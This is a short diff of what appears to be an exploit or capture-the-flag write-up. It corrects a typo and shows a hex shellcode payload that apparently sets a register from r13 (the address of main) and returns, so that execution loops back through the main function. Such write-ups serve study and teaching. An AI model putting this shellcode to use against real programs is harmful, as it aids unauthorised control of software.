@@ -489,7 +489,7 @@ d:  c3                      ret
 
 `r13 = main_addr`
 
-With this we can cyle over main function over and over again
+With this we can cycle over the main function over and over again
 
 ```
 payload = "\x4D\x89\xEE\x48\x31\xC0\x66\xB8\x1F\x2E\x49\x01\xC6\x41\x55\xC3"
